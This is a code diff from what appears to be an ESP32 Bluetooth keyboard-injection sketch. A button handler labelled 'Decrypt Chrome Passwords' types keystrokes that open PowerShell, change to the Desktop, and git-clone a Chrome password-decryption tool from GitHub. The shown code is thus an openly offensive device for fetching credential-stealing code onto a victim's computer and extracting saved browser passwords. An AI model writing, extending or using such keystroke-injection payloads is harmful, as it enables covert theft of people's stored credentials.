@@ -86,7 +86,9 @@ void loop() {
       Serial.println("Button 4: Decrypt Chrome Passwords (Pin 19)");
       openRun(); delay(300); 
       sendString("powershell"); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(300); 
+      bleKeyboard.press(KEY_RETURN); delay(300);
+      sendString("cd Desktop"); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(300);
       bleKeyboard.releaseAll(); delay(7000); // Wait for PowerShell to open
       sendString("git clone https://github.com/ohyicong/decrypt-chrome-passwords.git", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
@@ -110,4 +112,5 @@ void loop() {
     Serial.println("Waiting for BLE connection...");
   }
   delay(50); // Debounce/stability
+
 }
